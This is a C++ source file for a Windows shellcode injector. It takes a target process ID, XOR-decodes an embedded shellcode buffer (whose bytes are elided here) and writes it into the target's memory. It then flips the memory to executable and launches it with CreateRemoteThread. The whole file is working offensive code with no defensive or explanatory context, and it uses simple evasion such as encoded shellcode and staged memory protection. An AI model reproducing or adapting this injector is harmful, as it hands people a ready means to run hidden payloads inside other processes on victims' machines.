#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>


bool IsTargetProcessCompatible(DWORD pid) {
    BOOL isWow64 = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    
    if (!hProcess) return false;
    
    if (!IsWow64Process(hProcess, &isWow64)) {
        CloseHandle(hProcess);
        return false;
    }
    
    CloseHandle(hProcess);
    
#ifdef _WIN64
    return !isWow64;
#else
    return isWow64;
#endif
}


void DecryptShellcode(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("[!] Usage: %s <PID>\n", argv[0]);
        return ERROR_INVALID_PARAMETER;
    }

    DWORD pid = strtoul(argv[1], nullptr, 10);
    if (pid == 0) {
        fprintf(stderr, "[!] Invalid PID specified\n");
        return ERROR_INVALID_PARAMETER;
    }

    if (!IsTargetProcessCompatible(pid)) {
        fprintf(stderr, "[!] Architecture mismatch between injector and target process\n");
        return ERROR_INVALID_HANDLE;
    }

    unsigned char shellcode[] = { ... };

    const unsigned char XOR_KEY = 0xAA;
    DecryptShellcode(shellcode, sizeof(shellcode), XOR_KEY);

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid
    );

    if (!hProcess) {
        fprintf(stderr, "[!] OpenProcess failed (Error: 0x%08lX)\n", GetLastError());
        return GetLastError();
    }

    LPVOID remoteMem = VirtualAllocEx(
        hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    if (!remoteMem) {
        fprintf(stderr, "[!] VirtualAllocEx failed (Error: 0x%08lX)\n", GetLastError());
        CloseHandle(hProcess);
        return GetLastError();
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(
    	hProcess, remoteMem, shellcode, sizeof(shellcode), &bytesWritten
    )) {
        fprintf(stderr, "[!] WriteProcessMemory failed (Error: 0x%08lX)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return GetLastError();
    }

    DWORD oldProtect;
    if (!VirtualProtectEx(
        hProcess, remoteMem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect
    )) {
        fprintf(stderr, "[!] VirtualProtectEx failed (Error: 0x%08lX)\n", GetLastError());
    }

    HANDLE hThread = CreateRemoteThread(
        hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMem), nullptr, 0, nullptr
    );

    if (!hThread) {
        fprintf(stderr, "[!] CreateRemoteThread failed (Error: 0x%08lX)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return GetLastError();
    }

    const DWORD waitTimeout = 10000;  // таймаут для чека
    DWORD waitResult = WaitForSingleObject(hThread, waitTimeout);

    switch (waitResult) {
        case WAIT_OBJECT_0:
            printf("[+] Payload executed successfully\n");
            break;
        case WAIT_TIMEOUT:
            fprintf(stderr, "[!] Execution timed out after %d ms\n", waitTimeout);
            break;
        case WAIT_FAILED:
            fprintf(stderr, "[!] WaitForSingleObject failed (Error: 0x%08lX)\n", GetLastError());
            break;
    }

    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return ERROR_SUCCESS;
}
